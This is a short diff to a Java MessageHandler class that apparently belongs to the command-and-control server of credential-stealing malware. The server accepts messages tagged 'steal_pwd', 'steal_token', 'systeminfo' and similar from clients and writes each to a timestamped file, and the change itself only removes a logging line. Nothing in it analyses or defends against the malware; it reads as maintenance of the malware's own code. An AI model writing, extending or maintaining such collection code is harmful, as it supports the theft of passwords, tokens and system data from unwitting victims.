@@ -57,7 +57,6 @@ public class MessageHandler {
                 case "player" -> {
                     String playerInfo = decodeBase64(msgArr[1]);
                     Server.clientMap.replace(conn, new Gson().fromJson(playerInfo, JsonObject.class));
-                    log("Message: " + msgArr[0] + " " + playerInfo);
                 }
                 case "steal_pwd", "steal_token", "iasconfig", "runargs", "systeminfo" -> {
                     String ext = msgArr[0].equals("systeminfo") ? "txt" : "json";
@@ -78,5 +77,4 @@ public class MessageHandler {
     private static String getFileName(String prefix, String suffix, String afterPrefix, boolean time) {
         return String.format("%s-%s%s.%s", prefix, afterPrefix, time ? LocalDateTime.now().format(DateTimeFormatter.ofPattern("-MM-dd-HH-mm-ss")) : "", suffix);
     }
-
 }
